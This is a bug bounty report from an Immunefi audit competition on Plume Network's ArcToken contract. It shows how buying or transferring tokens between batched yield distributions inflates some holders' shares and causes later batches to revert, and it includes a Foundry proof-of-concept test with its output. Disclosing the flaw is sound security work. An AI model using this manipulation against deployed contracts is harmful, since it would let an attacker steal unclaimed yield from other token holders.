# 49787 sc high batched yield distribution doesn t account for transfers purchases between batches

**Submitted on Jul 19th 2025 at 13:31:56 UTC by @Vanshika for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #49787
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcToken.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief / Intro

`ArcToken` has a function to distribute yield in batches when the number of token holders is too high to fit in one transaction. Any change in user balances sandwiched between separate batches can lead to transaction revert and loss of yield for some token holders.

### Vulnerability Details

`ArcToken::distributeYieldWithLimit()` distributes yield to a specified range of token holders at a time. `holders` is an enumerable set of addresses among whom the total yield amount has to be distributed. When this is done in batches, if users at the beginning or middle can inflate their balance and get more yield between batches, the contract can run out of funds before it reaches the end.

The contract receives the `totalAmount` to distribute only at the first batch when `startIndex == 0`. Yield calculation for a token holder is:

```
uint256 share = (totalAmount * holderBalance) / effectiveTotalSupply;
```

`effectiveTotalSupply` is calculated as the sum of ArcToken balances for all eligible yield recipients. This calculation occurs separately for each batch of transfers, so `effectiveTotalSupply` can change between batches. This leads to incorrect yield shares or function reverts. A user can purchase more ArcTokens right before early batches, receive an inflated share, and then sell the tokens to a new holder to DoS one or more later batches.

## Impact Details

There is a high likelihood of accidental accounting errors and reverts during regular use of the function. This can also be exploited by malicious actors to steal yield from other token holders.

## Proof of Concept

<details>

<summary>PoC test (click to expand)</summary>

Copy the following test into `ArcToken.t.sol` and run with:

```
forge test --mt test_batchDistribution --via-ir
```

```
    function test_batchDistribution() public {
        // set-up
        address david = makeAddr("david");
        address ethan = makeAddr("ethan");
        token.transfer(bob, 100e18);
        token.transfer(charlie, 100e18);
        token.transfer(david, 100e18);
        token.transfer(ethan, 100e18);

        yieldBlacklistModule.addToBlacklist(owner); // owner balance not counted in effective balance
        yieldToken.approve(address(token), YIELD_AMOUNT);
        uint256 initialBalanceOwner = yieldToken.balanceOf(owner);

        token.distributeYieldWithLimit(YIELD_AMOUNT, 0, 3); //batch1

        // checks
        assertEq(yieldToken.balanceOf(owner), initialBalanceOwner - YIELD_AMOUNT, "owner has been blacklisted"); 
        // effectiveTotalSupply = 500e18 which will be split between 5 people. because owner balance does not count. 
        assertEq(yieldToken.balanceOf(alice), YIELD_AMOUNT / 5, ""); 
        assertEq(yieldToken.balanceOf(bob), YIELD_AMOUNT / 5, "");
        assertEq(yieldToken.balanceOf(charlie), 0, ""); // not part of this batch

        // token.distributeYieldWithLimit(YIELD_AMOUNT, 3, 3); // batch2 << not running this immediately.
        // BUG = what could be sandwiched between batches.

        token.transfer(charlie, 300e18);
        // new effectiveTokenSupply = 800e18. charlie gets 400e18 * YIELD_AMOUNT / 800e18
        token.distributeYieldWithLimit(YIELD_AMOUNT, 3, 1); // batch2
        // Keeping maxHolders to 1 because YIELD_AMOUNT leftover is insufficient to cover all remaining transfers and will revert <<< BUG

        assertEq(yieldToken.balanceOf(charlie), 400e18 * YIELD_AMOUNT / 800e18, ""); // went from 1/5 of YIELD_AMOUNT to 1/2
        // assertEq(yieldToken.balanceOf(david), YIELD_AMOUNT / 8, ""); // went from 1/5 of YIELD_AMOUNT to 1/8. There's not enough balance to cover that.
        // assertEq(yieldToken.balanceOf(ethan), YIELD_AMOUNT / 8, ""); // INSUFFICIENT BALANCE
    }
```

</details>

## Expected Results

If `maxHolders` in batch 2 = 1, expected test output:

```
Ran 1 test for test/ArcToken.t.sol:ArcTokenTest
[PASS] test_batchDistribution() (gas: 599048)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.41ms (410.18µs CPU time)

Ran 1 test suite in 4.30ms (1.41ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

If you test with `maxHolders = 2` or `3` for batch2 (uncomment David's assert), expected failing output:

```
Ran 1 test suite in 41.62ms (6.49ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ArcToken.t.sol:ArcTokenTest
[FAIL: ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 100000000000000000000 [1e20], 125000000000000000000 [1.25e20])] test_batchDistribution() (gas: 626814)

Encountered a total of 1 failing tests, 0 tests succeeded
```
